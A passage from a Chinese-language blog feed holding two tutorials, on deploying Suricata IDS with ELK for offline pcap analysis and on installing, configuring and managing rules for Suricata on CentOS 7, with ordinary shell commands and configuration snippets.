aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>开启成功后，访问kibina,可以看到suricata日志数据。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1603951881328.png" alt="1603951881328"></p><h1 id="5-离线模式部署"><a href="#5-离线模式部署" class="headerlink" title="5 离线模式部署"></a>5 离线模式部署</h1><h2 id="5-1-suricata分析流量包功能"><a href="#5-1-suricata分析流量包功能" class="headerlink" title="5.1 suricata分析流量包功能"></a>5.1 suricata分析流量包功能</h2><p> 分析单个包：suricata -r pcap文件名 -l 自定义输出位置</p><p> 分析文件夹里所以的包：suricata -r pcap文件夹名 -l 自定义输出位置 </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -r /tmp/test.cap -l  /var/log/suricata/cap<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-2-离线模式工作原理"><a href="#5-2-离线模式工作原理" class="headerlink" title="5.2 离线模式工作原理"></a>5.2 离线模式工作原理</h2><p>离线模式工作原理：离线一词即，流量收集集群将抓取的流量scp定时发送到ids主机，然后ids主机定时启动suricata -r分析cap流量文件，然后推送到elk进行展示。该过程涉及两个部分。其中定时采用linux的crontab。</p><p>（1）流量收集集群定时推送流量文件到ids主机</p><p>定时推送流量到ids主机脚本send.sh如下：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token function">scp</span> -Rf /root/testdir/ wasadmin@10.127.40.25:/root/temp/<span class="token comment" spellcheck="true">#复制到ids文件夹/root/temp/</span><span class="token function">rm</span> -rf /root/testdir/*<span class="token comment" spellcheck="true">#删除该主机文件夹下的所有文件</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>（2）ids主机定时分析</p><p>ids主机定时分析脚本如下suricara.sh：</p><pre class="line-numbers language-bash"><code class="language-bash">suricata -c /etc/suricata/suricata.yaml -r /root/temp/<span class="token function">rm</span> -rf /root/temp/*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>定时执行suricara.sh，在终端输入以下命令：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">crontab</span> -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在显示的文件末尾添加以下规则：#每5分钟运行一次time.sh脚本,并把错误和正确的日志都存到/tmp/load.log上。</p><pre class="line-numbers language-bash"><code class="language-bash">*/5 * * * * /root/time.sh <span class="token operator">></span> /tmp/load.log 2<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>编辑完成，保存完成以后，就会显示以下提示信息：</p><pre class="line-numbers language-bash"><code class="language-bash">crontab: installing new <span class="token function">crontab</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这就说明正在安装新的定时任务，如果没有这条提示信息，请重新运行<code>crontab -e</code>命令。</p><p><img src="/2020/09/11/install-guide-elk-suricata/1604578836302-1611127871322.png" alt="1604578836302"></p><h1 id="错误解决"><a href="#错误解决" class="headerlink" title="错误解决"></a>错误解决</h1><p><img src="/2020/09/11/install-guide-elk-suricata/1603938736430.png" alt="1603938736430"></p><p><a href="https://blog.csdn.net/weixin_44105991/article/details/91320644">Solution</a>：</p><p>1 先执行命令 free -m查看内存是不是还有 最主要的是 看有没有交换空间 swap  </p><p>2  创建swapfile：dd if=/dev/zero of=swapfile bs=1024 count=500000</p><p>3  将swapfile设置为swap空间    mkswap swapfile </p><p>4  启用交换空间   swapon swapfile ( 删除交换空间是swapoff swapfile )</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">free</span> -m<span class="token function">dd</span> if<span class="token operator">=</span>/dev/zero of<span class="token operator">=</span>swapfile bs<span class="token operator">=</span>1024 count<span class="token operator">=</span>500000mkswap swapfile swapon swapfile <span class="token function">free</span> -m<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/_Logstash_Kibana_and_Suricata_JSON_output">官网suricata+elk部署指南</a></p><p><a href="https://www.elastic.co/cn/downloads/">elk官方下载连接</a></p><p><a href="http://www.justdojava.com/2019/08/11/elk-install/">elk部署教程</a> 简单清晰</p><p><a href="https://zhuanlan.zhihu.com/p/64742715">suricata+elk其他部署方式</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk架构+filebeat解析</a></p><p><a href="https://developer.ibm.com/zh/articles/os-cn-elk-filebeat/">elk日志收集教程</a></p><p><a href="https://aws.amazon.com/cn/blogs/china/using-vpc-traffic-mirroring-to-construct-network-intrusion-detection-system-update/">借助 VPC Traffic Mirroring 构建网络入侵检测系统</a>  实时分析流量</p><p><a href="https://www.freebuf.com/articles/network/249549.html">elk+suricata(docker部署)</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/">流量分析</category>
      
      
      <comments>https://m01ly.github.io/2020/09/11/install-guide-elk-suricata/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>centos7中安装suricata</title>
      <link>https://m01ly.github.io/2020/09/11/install-guide-suricata/</link>
      <guid>https://m01ly.github.io/2020/09/11/install-guide-suricata/</guid>
      <pubDate>Fri, 11 Sep 2020 09:59:18 GMT</pubDate>
      
      <description>&lt;p&gt;由于不断的安全威胁，入侵检测系统（IDS）已成为当今&lt;a href=&quot;http://www.learnfuture.com/product/datacenter&quot;&gt;数据中心&lt;/a&gt;环境中最关键的要求之一。但是，随着越来越多的服务器将其NIC升级到10GB / 40GB以太网，以线速在商用硬件上实施计算密集型入侵检测变得越来越困难。扩展IDS性能的一种方法是多线程IDS，其中CPU密集型深度数据包检查工作负载并行化为多个并发任务。这种并行检查可以利用多核硬件轻松扩展IDS吞吐量。这个领域的两个着名的开源工作是Suricata和Bro。&lt;/p&gt;
&lt;p&gt;在本教程中，我将演示如何在&lt;a href=&quot;http://www.learnfuture.com/Linux&quot;&gt;Linux&lt;/a&gt;服务器上安装和配置Suricata IDS。&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>由于不断的安全威胁，入侵检测系统（IDS）已成为当今<a href="http://www.learnfuture.com/product/datacenter">数据中心</a>环境中最关键的要求之一。但是，随着越来越多的服务器将其NIC升级到10GB / 40GB以太网，以线速在商用硬件上实施计算密集型入侵检测变得越来越困难。扩展IDS性能的一种方法是多线程IDS，其中CPU密集型深度数据包检查工作负载并行化为多个并发任务。这种并行检查可以利用多核硬件轻松扩展IDS吞吐量。这个领域的两个着名的开源工作是Suricata和Bro。</p><p>在本教程中，我将演示如何在<a href="http://www.learnfuture.com/Linux">Linux</a>服务器上安装和配置Suricata IDS。</p><a id="more"></a><p>官网： <a href="https://suricata-ids.org/">https://suricata-ids.org/</a> </p><p>官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Suricata_Installation</a> </p><p>centos官网安装教程： <a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation">https://redmine.openinfosecfoundation.org/projects/suricata/wiki/CentOS_Installation</a> </p><h1 id="一安装教程"><a href="#一安装教程" class="headerlink" title="一安装教程"></a>一安装教程</h1><p>操作系统：Centos7</p><p>安装版本：suricata6.0.0</p><p>1)安装wget</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install wget -y</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>2)更换源</p><p>　　更换成阿里云源，更新系统、下载软件速度快</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-7.repo</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum clean all</span><span class="token punctuation">[</span>root@suricata~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum makecache</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>3)更新系统</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum -y update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261907715.png" alt="1603261907715"></p><p>4)安装epel</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># yum install epel-release</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603261947721.png" alt="1603261947721"></p><p>5)安装相关依赖</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo yum -y install gcc libpcap-devel pcre-devel libyaml-devel file-devel \</span>zlib-devel jansson-devel nss-devel libcap-ng-devel libnet-devel <span class="token function">tar</span> <span class="token function">make</span> \libnetfilter_queue-devel lua-devel PyYAML libmaxminddb-devel rustc cargo \lz4-devel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262215276.png" alt="1603262215276"></p><p>6)开始安装suricata</p><p>这里尝试安装官网<a href="https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz">最新6.0版本</a></p><p> <a href="https://suricata-ids.org/download/">https://suricata-ids.org/download/</a> </p><p><img src="/2020/09/11/install-guide-suricata/1603262265601.png" alt="1603262265601"></p><p>下载安装包，进行解压配置安装：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># wget https://www.openinfosecfoundation.org/download/suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tar -xvzf suricata-6.0.0.tar.gz</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd suricata-6.0.0</span><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># ./configure --prefix=/usr --sysconfdir=/etc --localstatedir=/var --enable-nfqueue --enable-lua</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603262683253.png" alt="1603262683253"></p><p>之后再编译安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo make install</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603878275030.png" alt="1603878275030"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly suricata-6.0.0<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo ldconfig</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后进行一些配置：</p><p>（1）自动为您创建/设置所有必需的目录和suricata.yaml：</p><pre><code>[root@m01ly suricata-6.0.0]#make install-conf</code></pre><p>（2） 自动配置规则集</p><pre><code>[root@m01ly suricata-6.0.0]#make install-rules</code></pre><p>将执行常规的“ make install”，然后它将自动从Suricata的“ Emerging Threats ”中下载并设置最新规则集</p><p>（3）将结合上述所有内容（install-conf和install-rules）-并为您提供可以运行（配置和设置）的Suricata</p><pre><code>[root@m01ly suricata-6.0.0]#make install-full</code></pre><p>安装完成后，安装目录为：/etc/suricata，配置文件为/etc/suricata/suricata.yaml</p><h1 id="二-基础配置"><a href="#二-基础配置" class="headerlink" title="二 基础配置"></a>二 基础配置</h1><p>按照<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Basic_Setup">官方基础配置</a>一步步就可。注意图中的cp指令一块不需要操作，6.0版本自动会复制。<img src="/2020/09/11/install-guide-suricata/1603693471544.png" alt="1603693471544"></p><p>(1) 创建目录</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> /var/log/suricata<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/suricata<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre><code>[root@ids0001 suricata-5.0.0]# cd etc[root@ids0001 etc]# lsclassification.config  Makefile.am  reference.config    suricata.logrotate.in  suricata.service.inMakefile               Makefile.in  suricata.logrotate  suricata.service[root@ids0001 etc]# sudo cp classification.config /etc/suricata[root@ids0001 etc]# sudo cp reference.config /etc/suricata</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603855808097.png" alt="1603855808097"></p><pre><code>./configure &amp;&amp; make &amp;&amp; make install-conf</code></pre><p>需要一段时间，最后结果：</p><p><img src="/2020/09/11/install-guide-suricata/1603878960614.png" alt="1603878960614"></p><p>自动下载和设置从正在出现的威胁可Suricata最新的规则集。</p><p>./configure &amp;&amp; make &amp;&amp; make install-rules</p><p>需要又一段时间，最后结果：</p><p>./configure &amp;&amp; make &amp;&amp; make install-full</p><h2 id="2-1-基础配置"><a href="#2-1-基础配置" class="headerlink" title="2.1 基础配置"></a>2.1 基础配置</h2><p> 配置文件位于**/etc/suricata/suricata.yaml**。用VIM打开</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># cd /etc/suricata/</span><span class="token punctuation">[</span>root@m01ly suricata<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># vim suricata.yaml</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>（1）配置要拦截的流量设置</p><p> 在“vars”部分下，您将找到Suricata使用的几个重要变量。</p><p>“HOME_NET”应指向Suricata要检查的本地网络。</p><p>“！$ HOME_NET”（分配给EXTERNAL_NET）是指除本地网络之外的任何其他网络。</p><p>“XXX_PORTS”表示不同服务使用的端口号。请注意，无论使用何种端口，Suricata都可以自动检测HTTP流量。因此，正确指定HTTP_PORTS变量并不重要。</p><p>先设置HOME_NET与EXTERNAL_NET，推荐HOME_NET填写内网网段，EXTERNAL_NET设置为any</p><p>注意如果HOME_NET设置了any，EXTERNAL_NET设置！HOME_NET的话会报错，如果HOME_NET设置了内网地址，EXTERNAL_NET设置为！$HOME_NET的话，有些内网之间的告警就无法匹配到 </p><p><img src="/2020/09/11/install-guide-suricata/1603708931016.png" alt="1603708931016"></p><p>（2）指定日志文件目录</p><p><img src="/2020/09/11/install-guide-suricata/1603708864025.png" alt="1603708864025"></p><p>（3） host-os-policy 配置，在文件百分之60处。</p><p> “host-os-policy”部分用于防御一些众所周知的攻击，这些攻击利用操作系统的网络堆栈（例如，TCP重组）的行为来逃避检测。作为对策，现代IDS提出了所谓的“基于目标”的检查，其中检查引擎基于流量的目标操作系统微调其检测算法。因此，如果您知道正在运行的OS个别本地主机，您可以将该信息提供给Suricata以提高其检测率。 </p><p><img src="/2020/09/11/install-guide-suricata/1603709095833.png" alt="1603709095833"></p><p>（4）线程</p><p>在“线程”部分下，您可以为不同的Suricata线程指定CPU关联。默认情况下，禁用CPU关联（“set-cpu-affinity：no”），这意味着将在任何可用的CPU核心上调度Suricata线程。默认情况下，Suricata将为每个CPU核心创建一个“检测”线程。您可以通过指定“detect-thread-ratio：N”来调整此行为。这将创建N * M个检测线程，其中M是主机上CPU核心的总数。</p><p>使用上述线程设置，Suricata将创建1.5 * M检测线程，其中M是系统上CPU核心的总数。</p><h2 id="2-2-启动"><a href="#2-2-启动" class="headerlink" title="2.2 启动"></a>2.2 启动</h2><h3 id="2-2-1-关闭-LRO-GRO"><a href="#2-2-1-关闭-LRO-GRO" class="headerlink" title="2.2.1 关闭 LRO / GRO"></a>2.2.1 关闭 LRO / GRO</h3><p>当您使用<code>pcap</code>捕获模式时，强烈建议关闭Suricata正在侦听的NIC上的任何数据包offloead功能（例如，LRO / GRO），因为这些功能可能会干扰实时数据包捕获。</p><p>以下是如何在网络接口eth0上关闭LRO / GRO：</p><pre><code>[root@m01ly ~]# sudo ethtool -K ens33 gro off lro off</code></pre><h3 id="2-2-2-测试是否配置成功："><a href="#2-2-2-测试是否配置成功：" class="headerlink" title="2.2.2 测试是否配置成功："></a>2.2.2 测试是否配置成功：</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata -T</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603697120852.png" alt="1603697120852"></p><h3 id="2-2-3-运行模式"><a href="#2-2-3-运行模式" class="headerlink" title="2.2.3  运行模式"></a>2.2.3  运行模式</h3><p>Suricata支持多种运行模式。运行模式确定不同线程如何用于IDS。以下命令列出了所有<a href="https://redmine.openinfosecfoundation.org/projects/suricata/wiki/Runmodes">可用的runmodes</a>。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata --list-runmodes</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> Suricata使用的默认运行模式是<code>autofp</code>（代表“自动流固定负载平衡”）。在此模式下，来自每个不同流的数据包将分配给单个检测线程。将流分配给具有最少数量的未处理数据包的线程。 </p><h3 id="2-2-4-启动suricata"><a href="#2-2-4-启动suricata" class="headerlink" title="2.2.4 启动suricata"></a>2.2.4 启动suricata</h3><p>启动命令：sudo suricata -c 启动文件 -i 网卡名称 –init-errors-fatal：例如下面</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@suricata ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml    -i ens33   -s /etc/suricata/rules/test.rules</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603709547401.png" alt="1603709547401"></p><p>后台启用：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># sudo nohup /usr/local/bin/suricata -c /etc/suricata/suricata.yaml -i eth0 --init-errors-fatal &amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-5-查看日志"><a href="#2-2-5-查看日志" class="headerlink" title="2.2.5 查看日志"></a>2.2.5 查看日志</h3><p>Suricata检测日志存储在/ var / log / suricata目录中。</p><p>其中fast.log表示命中规则的日志。</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/fast.log</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603713977753.png" alt="1603713977753"></p><p>为了便于导入，日志也以json格式提供：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># tail -f /var/log/suricata/eve.json</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603714049656.png" alt="1603714049656"></p><h1 id="三-规则管理"><a href="#三-规则管理" class="headerlink" title="三 规则管理"></a>三 规则管理</h1><h2 id="3-1-规则介绍"><a href="#3-1-规则介绍" class="headerlink" title="3.1 规则介绍"></a>3.1 规则介绍</h2><h3 id="3-1-1-规则集"><a href="#3-1-1-规则集" class="headerlink" title="3.1.1 规则集"></a>3.1.1 规则集</h3><p>suricata系统自带的规则主要是et/open 规则，目前开源免费的就是et/open、pt规则、sslbl规则，其余的需要授权码才能更新，如下：</p><ol><li><a href="https://github.com/jasonish/suricata-trafficid/blob/master/rules/traffic-id.rules">Suricata作者写的一个规则生成的脚本</a>：生成用于应用和服务识别的规则。</li><li><a href="https://sslbl.abuse.ch/blacklist/sslblacklist.rule">瑞士的非盈利组织abuse.ch维护的项目</a>：他们维护的这个黑名单是标识恶意软件与僵尸网络相关的，列表里面提供了有关恶意软件与僵尸网络的ssl证书列表，根据证书特征来匹配流量中的威胁。他们提供了一个Suricata的规则，可以根据黑名单检测网络中的恶意连接。</li><li><a href="https://github.com/ptresearch/AttackDetection">PT的Suricata规则库</a>：根据恶意软件、黑客的网络通讯协议以及漏洞的poc去编写，里面包含了近几年常见cve漏洞的检测，更新十分及时。</li><li><a href="https://rules.emergingthreats.net/open/suricata/rules/">Emerging Threats维护的规则</a>：这个就比较熟悉了，我们一般常用的就是这个规则库。很强大的规则库，规则数量有20000+ 。<a href="http://doc.emergingthreats.net/bin/view/Main/EmergingFAQ#What_is_the_general_intent_of_ea">官方规则解释</a></li></ol><h3 id="3-1-2-规则管理工具"><a href="#3-1-2-规则管理工具" class="headerlink" title="3.1.2 规则管理工具"></a>3.1.2 规则管理工具</h3><p>规则管理，就是便于对suricata的规则进行统一的管理，比如更新、启用、停用等。相关的规则管理工具有很多，简单列举几个：   </p><ul><li><a href="https://github.com/jasonish/suricata-update">Suricata-Update</a> ：常用工具</li><li><a href="https://github.com/StamusNetworks/scirius">Scirius</a>：Scirius是个管理Suricata规则集的Web应用。搭建和使用也不难，参见github。</li><li><a href="https://www.jianshu.com/p/1a96770695db">Oinkmaster</a></li><li><a href="https://github.com/shirkdog/pulledpork">Pulledpork：</a></li></ul><h2 id="3-2-规则更新"><a href="#3-2-规则更新" class="headerlink" title="3.2 规则更新"></a>3.2 规则更新</h2><p>suricata规则更新可以使用suricata-update来进行更新, 输入suricata-update 会自动进行规则更新，显示当前已经更新与启用了多少规则 </p><h3 id="3-2-1-更新规则库"><a href="#3-2-1-更新规则库" class="headerlink" title="3.2.1 更新规则库"></a>3.2.1 更新规则库</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 最近的一次更新结果如下，规则总数为28178条： </p><p><img src="/2020/09/11/install-guide-suricata/1603697024470.png" alt="1603697024470"></p><p>规则更新后，所有的规则都会保存在/var/lib/suricata/rules/suricata.rules这一个文件中，这个时候就必须修改suricata配置文件suricata.yaml的default-rule-path与rule-files来指定规则文件到这个规则上:</p><pre class="line-numbers language-bash"><code class="language-bash">default-rule-path: /var/lib/suricata/rulesrule-files:  - suricata.rules<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="3-2-2-更新规则源"><a href="#3-2-2-更新规则源" class="headerlink" title="3.2.2 更新规则源"></a>3.2.2 更新规则源</h3><p>（1）更新规则源：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update update-sources</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><p>（2）列出更新源列表 suricata-update list-sources </p><p><img src="/2020/09/11/install-guide-suricata/1603697274919.png" alt="1603697274919"></p><p>每个规则集都有一个前缀为“vendor”的名称，后跟一个集名称。例如，iosf的traffic id规则集称为“iosf/trafficid”。</p><h3 id="3-2-3-启用某个规则集"><a href="#3-2-3-启用某个规则集" class="headerlink" title="3.2.3 启用某个规则集"></a>3.2.3 启用某个规则集</h3><p>要启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source ptresearch/attackdetection</span><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700718529.png" alt="1603700718529"></p><h3 id="3-2-4-禁用规则"><a href="#3-2-4-禁用规则" class="headerlink" title="3.2.4 禁用规则"></a>3.2.4 禁用规则</h3><p>使用Suricata-update更新规则时，默认是将所有规则合并在一个规则文件中：/var/lib/suricata/rules/suricata.rules。</p><p><img src="/2020/09/11/install-guide-suricata/1603705089676.png" alt="1603705089676"></p><p>Suricata-update有个 –no-merge参数，使用这个参数更新规则，规则不会进行合并，是以独立的文件存在于文件夹下。但是在管理规则的时候很不方便，必须要自己管理Suricata引入的规则。但是在禁用规则的时候，也可以使用suricata-update去配置disable.conf禁用的规则。不推荐使用 –no-merge参数更新规则。指定一个文件让suricata-update合并输出会更简单。在suricata.yaml中修改default-rule-path和rule-files。</p><p><img src="/2020/09/11/install-guide-suricata/1603708490301.png" alt="1603708490301"></p><p>通过suricata-udpate可以很好的控制规则，例如要禁用某一个规则，直接新建/etc/suricata/disable.conf 文件，然后在里面填入sid，每次更新的话会自动禁止该规则 </p><p>默认情况下 <code>suricata-update</code> 将所有规则合并到一个文件“/var/lib/suricata/rules”/苏里克塔规则”.</p><p>要启用默认禁用的规则，请使用 /etc/suricata/enable.conf</p><pre><code>2019401                   # enable signature with this sidgroup:emerging-icmp.rules # enable this rulefilere:trojan                 # enable all rules with this string</code></pre><p>类似地，要禁用规则，请使用 /etc/suricata/disable.conf ：</p><pre class="line-numbers language-bash"><code class="language-bash">2019401                   <span class="token comment" spellcheck="true"># disable signature with this sid</span>group:emerging-info.rules <span class="token comment" spellcheck="true"># disable this rulefile</span>re:heartbleed             <span class="token comment" spellcheck="true"># disable all rules with this string</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>更新这些文件后，</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update --disable-conf /etc/suricata/disable.conf</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重新运行 <code>suricata-update</code> 再一次：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#sudo suricata-update</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后重新开始测量。</p><h2 id="3-5-规则源的CRUD"><a href="#3-5-规则源的CRUD" class="headerlink" title="3.5 规则源的CRUD"></a>3.5 规则源的CRUD</h2><h3 id="3-5-1-列出我们使用的规则源"><a href="#3-5-1-列出我们使用的规则源" class="headerlink" title="3.5.1 列出我们使用的规则源"></a>3.5.1 列出我们使用的规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># suricata-update list-enabled-sources</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2020/09/11/install-guide-suricata/1603701147686.png" alt="1603701147686"></p><h3 id="3-5-2-更新规则源"><a href="#3-5-2-更新规则源" class="headerlink" title="3.5.2 更新规则源"></a>3.5.2 更新规则源</h3><pre><code>[root@m01ly ~]#suricata-update update-sources</code></pre><p><img src="/2020/09/11/install-guide-suricata/1603700557845.png" alt="1603700557845"></p><h3 id="3-5-3-删除某个规则源"><a href="#3-5-3-删除某个规则源" class="headerlink" title="3.5.3 删除某个规则源"></a>3.5.3 删除某个规则源</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update remove-source et/pro</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-5-4-启动某个规则源"><a href="#3-5-4-启动某个规则源" class="headerlink" title="3.5.4 启动某个规则源"></a>3.5.4 启动某个规则源</h3><p>启用ptresearch/attackdetection的规则集：</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@m01ly ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#suricata-update enable-source 